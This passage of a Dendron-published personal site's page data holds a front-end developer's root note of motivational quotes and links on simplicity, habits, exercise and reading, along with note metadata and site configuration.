다층 방어를 구축하세요.</p>\n</blockquote>","noteIndex":{"id":"Iy0MoL0KnL55Br3AfTS2C","title":"Luke","desc":"","updated":1761796791487,"created":1644449449778,"custom":{"nav_order":0,"permalink":"/"},"fname":"root","type":"note","vault":{"fsPath":"vault"},"contentHash":"4e745570ca97988a0362cb939b760952","links":[{"type":"wiki","from":{"fname":"root","id":"Iy0MoL0KnL55Br3AfTS2C","vaultName":"vault"},"value":"life-tips","position":{"start":{"line":41,"column":5,"offset":2603},"end":{"line":41,"column":29,"offset":2627},"indent":[]},"xvault":false,"sameFile":false,"to":{"fname":"life-tips","anchorHeader":"wodenokoto"}},{"type":"wiki","from":{"fname":"root","id":"Iy0MoL0KnL55Br3AfTS2C","vaultName":"vault"},"value":"journal.what-i-read-in.2025","alias":"What I read in 2025","position":{"start":{"line":70,"column":3,"offset":4333},"end":{"line":70,"column":54,"offset":4384},"indent":[]},"xvault":false,"sameFile":false,"to":{"fname":"journal.what-i-read-in.2025"}},{"type":"wiki","from":{"fname":"root","id":"Iy0MoL0KnL55Br3AfTS2C","vaultName":"vault"},"value":"journal.what-i-read-in.2024","alias":"2024","position":{"start":{"line":71,"column":5,"offset":4389},"end":{"line":71,"column":41,"offset":4425},"indent":[]},"xvault":false,"sameFile":false,"to":{"fname":"journal.what-i-read-in.2024"}},{"type":"wiki","from":{"fname":"root","id":"Iy0MoL0KnL55Br3AfTS2C","vaultName":"vault"},"value":"journal.what-i-read-in.2023","alias":"2023","position":{"start":{"line":72,"column":5,"offset":4430},"end":{"line":72,"column":41,"offset":4466},"indent":[]},"xvault":false,"sameFile":false,"to":{"fname":"journal.what-i-read-in.2023"}},{"type":"wiki","from":{"fname":"root","id":"Iy0MoL0KnL55Br3AfTS2C","vaultName":"vault"},"value":"journal.what-i-read-in.2022","alias":"2022","position":{"start":{"line":73,"column":5,"offset":4471},"end":{"line":73,"column":41,"offset":4507},"indent":[]},"xvault":false,"sameFile":false,"to":{"fname":"journal.what-i-read-in.2022"}},{"type":"wiki","from":{"fname":"root","id":"Iy0MoL0KnL55Br3AfTS2C","vaultName":"vault"},"value":"journal.what-i-struggled-brag-in","position":{"start":{"line":79,"column":3,"offset":4643},"end":{"line":79,"column":39,"offset":4679},"indent":[]},"xvault":false,"sameFile":false,"to":{"fname":"journal.what-i-struggled-brag-in"}}],"anchors":{"what-i-read-in-past":{"type":"header","text":"What I read in past","value":"what-i-read-in-past","line":74,"column":0,"depth":2}},"children":["zd4mq442jike0pr0wba1u3m","6hzeqsofq67gdk88flxlkhp","778ijii93yu5uwnrwmn5zi4","g1fngdjl25nes6fs3lip602","ZbdkdApFqLdks4Moq92R9","uoc5hhki3o4py15cesddu8q","9qf7j06jtdkm6rnx9ymvwb0","5zn10cvj7ajy2gh2is5nqmg","4qo9ma0z0yu1czns6pxl7y5","ok0e729ho7o09xetujkxc0m","GR5x8HnNFEN6fU2UBSEIK","yirtnlj8q24yutcf3ss1xqy","eq0wc6t7wl2wv221yb68ro4","7x2fnv4j6gxts08qk0jguny","ettkt3iClONnxpbGwBVLl","7l4knev6v613tbuoskvmbdg","hvh5bud6yp7dc89tuh95tr9","4fvoqrplw0cweo554usbjos","f8qsfql0a9v8thpeo82udfa","1swsbrhqi9jk41v9eodyi5q","SQqYupi6EFddTerBA8RRD","hjNeNc1F2JUh0lTWanH4h","qf0l4wbrc9jgooyzexmbq5v","uur1lkol353z9vfeqb3n5bv","cd9n1czq3ursgkby985wkmm","k1sr43vwnfqztwc0s43pkcf","wfde75rhdvq2yfa2zy2q6rv","rjcmdv60jokmbw6zoq8u2ef","ujapvww8o6v3kpmlhtryq4k","pkwewou9d5e8ystswn1j2b4"],"parent":null,"data":{},"body":"\nHi there 👋. I'm a Front-end developer.\n\n---\n\n- 단순함과 꾸준함은 가장 쉬우면서도 지키기 어려운 원칙.\n\n- 🥱 -> 🤔💡🌱 - [On The Death of Daydreaming](https://www.afterbabel.com/p/on-the-death-of-daydreaming)\n  - boredom -> easy fun -> art -> profit?\n\n> I've often described my motivation for building software to others using imagery: I like to go find a secluded beach, build a large, magnificent sand castle, and then walk away. Will anyone notice? Probably not. Will the waves eventually destroy it? Yep. Did I still get immense satisfaction? Absolutely. - [aliasxneo](https://news.ycombinator.com/item?id=41497113)\n\n> We love to see the process, not just the result. The imperfections in your work can be beautiful if they show your struggle for perfection, not a lack of care. - [ralphammer](https://ralphammer.com/is-perfection-boring/)\n\n> Simplicity, even if it sacrifices some ideal functionality has better survival characteristics than the-right-thing. - [The Rise of Worse is Better](https://www.dreamsongs.com/RiseOfWorseIsBetter.html)\n\n> [Roberto Blake was talking about making 100 crappy videos](https://www.youtube.com/watch?v=OnUBaQ1Sp_E) to get better over time. Putting in the reps and improving a little bit each time.\n>\n> Putting in the work without expecting any external reward at first (eg views, followers, likes, etc) will pay off in the long run. - [100 Scrappy Things](https://www.florin-pop.com/blog/100-scrappy-things/)\n\n> Make the difficult habitual, the habitual easy, and the easy beautiful. - [Constantin S. Stanislavski](https://www.goodreads.com/quotes/7102271-make-the-difficult-habitual-the-habitual-easy-and-the-easy)\n\n> A good match is a **structured** dance, where players aim to **score** while they are following well-defined **rules**. This **freedom within a structure** is what makes it fun. - [ralphammer](https://ralphammer.com/how-to-get-started/)\n\n- [Pivot Points](https://longform.asmartbear.com/pivot-points/)\n\n  - non-judgmental aspects of personality that can be strengths in some contexts and weaknesses in others\n  - Pivot Points are fixed in the short term\n\n- [Hedged Bets](https://longform.asmartbear.com/predict-the-future/#hedged-bets)\n  - trading slightly less maximum upside for predictable, net-positive outcomes.\n\n> “Motivation often comes after starting, not before. Action produces momentum.”\n> [When you start a new habit, it should take less than two minutes to do.](https://jamesclear.com/how-to-stop-procrastinating)\n>\n> - James Clear\n\n> Focus is more about **not** keeping busy when you need to wait for something.  \n> Eat the boredom for a minute.\n>\n> - [[life-tips#wodenokoto]]\n\n> [4 minutes run hard enough to push heart rate to 90%, 3 minutes recover, repeat 4 times](https://news.ycombinator.com/item?id=34213181)\n>\n> - https://www.ntnu.edu/cerg/advice\n> - [Get running with Couch to 5K](https://www.nhs.uk/live-well/exercise/running-and-aerobic-exercises/get-running-with-couch-to-5k/)\n\n> [recommended routine - bodyweightfitness](https://www.reddit.com/r/bodyweightfitness/wiki/kb/recommended_routine/) - I Don't Have This Much Time!\n>\n> - Don't workout at all (saves anywhere from 20 to 60 minutes, but really, really, really, really, really, really, really, really, really not recommended)\n\n> 도무지 읽히지 않는 책 앞에서 내가 택한 방법은 펼쳐진 페이지 앞에서 멍때리기이다. 다르게 표현하면 이렇다. 펼쳐진 두 페이지 앞에서 오래 머물기.\n>\n> 책을 펼쳐놓는 것으로 충분하다. 읽지 못해도 좋다. 매일 정해진 진도를 나가야 하는 학교 수업이 아니니까. 하지만 읽지 않아도 괜찮다고 해서 펼쳐두지조차 않으면 곤란하다. 가능한 한 자주 책을 펼쳐두도록 하자. 전혀 읽지 않고 멍하니 바라보고 있다가 다시 덮게 되더라도\n>\n> - 막막한 독서. 시로군. P.10~13\n\n> I think it should be everyone's primary focus to sleep well, drink water, get outside, get active, and eat generally decently. I hate to say it, but if you're not eating a good amount of vegetables and fruit, decent protein, sleep, etc, no amount of XYZ will catch up to that detriment. - [CE02](https://news.ycombinator.com/item?id=35056071)\n\n> My real battle is doing good versus doing nothing. - [Deirdre Sullivan](https://www.npr.org/2005/08/08/4785079/always-go-to-the-funeral)\n\n[Kind Engineering](https://kind.engineering/) - How To Engineer Kindness\n\n> Sometimes magic is just someone spending more time on something than anyone else might reasonably expect. - [Teller](https://www.goodreads.com/quotes/6641527-sometimes-magic-is-just-someone-spending-more-time-on-something)\n\n---\n\n## What I read in past\n\n- [[What I read in 2025|journal.what-i-read-in.2025]]\n  - [[2024|journal.what-i-read-in.2024]]\n  - [[2023|journal.what-i-read-in.2023]]\n  - [[2022|journal.what-i-read-in.2022]]\n- 📝 [Gists](https://gist.github.com/Luke-SNAW)\n- 📜 [Journals](https://luke-snaw.github.io/Luke-SNAW__netlify-CMS.github.io/)\n\n---\n\n- [[journal.what-i-struggled-brag-in]]\n"},"collectionChildren":null,"customHeadContent":null,"config":{"version":5,"dev":{"enablePreviewV2":true},"commands":{"lookup":{"note":{"selectionMode":"extract","confirmVaultOnCreate":true,"vaultSelectionModeOnCreate":"smart","leaveTrace":false,"bubbleUpCreateNew":true,"fuzzThreshold":0.2}},"randomNote":{},"insertNoteLink":{"aliasMode":"none","enableMultiSelect":false},"insertNoteIndex":{"enableMarker":false},"copyNoteLink":{"aliasMode":"title"},"templateHierarchy":"template"},"workspace":{"vaults":[{"fsPath":"vault"}],"journal":{"dailyDomain":"daily","name":"journal","dateFormat":"y.MM.dd","addBehavior":"childOfDomain"},"scratch":{"name":"scratch","dateFormat":"y.MM.dd.HHmmss","addBehavior":"asOwnDomain"},"task":{"name":"","dateFormat":"","addBehavior":"childOfCurrent","statusSymbols":{"":" ","wip":"w","done":"x","assigned":"a","moved":"m","blocked":"b","delegated":"l","dropped":"d","pending":"y"},"prioritySymbols":{"H":"high","M":"medium","L":"low"},"todoIntegration":false,"createTaskSelectionType":"selection2link","taskCompleteStatus":["done","x"]},"graph":{"zoomSpeed":1,"createStub":false},"enableAutoCreateOnDefinition":false,"enableXVaultWikiLink":false,"enableRemoteVaultInit":true,"enableUserTags":false,"enableHashTags":true,"workspaceVaultSyncMode":"noCommit","enableAutoFoldFrontmatter":false,"enableEditorDecorations":true,"maxPreviewsCached":10,"maxNoteLength":204800,"dendronVersion":"0.115.0","enableFullHierarchyNoteTitle":false,"enablePersistentHistory":false},"preview":{"enableFMTitle":true,"enableNoteTitleForLink":true,"enablePrettyRefs":true,"enableKatex":true,"automaticallyShowPreview":false,"enableFrontmatterTags":true,"enableHashesForFMTags":false},"publishing":{"enableFMTitle":true,"enableNoteTitleForLink":true,"enablePrettyRefs":true,"enableKatex":true,"copyAssets":true,"siteHierarchies":["root"],"writeStubs":false,"siteRootDir":"docs","seo":{"title":"Luke SNAW","description":"Personal knowledge space"},"github":{"enableEditLink":false,"editLinkText":"Edit this page on GitHub","editBranch":"main","editViewMode":"tree"},"enableSiteLastModified":true,"enableFrontmatterTags":true,"enableHashesForFMTags":false,"enableRandomlyColoredTags":true,"enableTaskNotes":true,"enablePrettyLinks":true,"searchMode":"lookup","siteUrl":"https://luke-snaw.github.io/","duplicateNoteBehavior":{"action":"useVault","payload":["vault"]},"siteFaviconPath":"favicon.ico","siteIndex":"root"}}},"__N_SSG":true}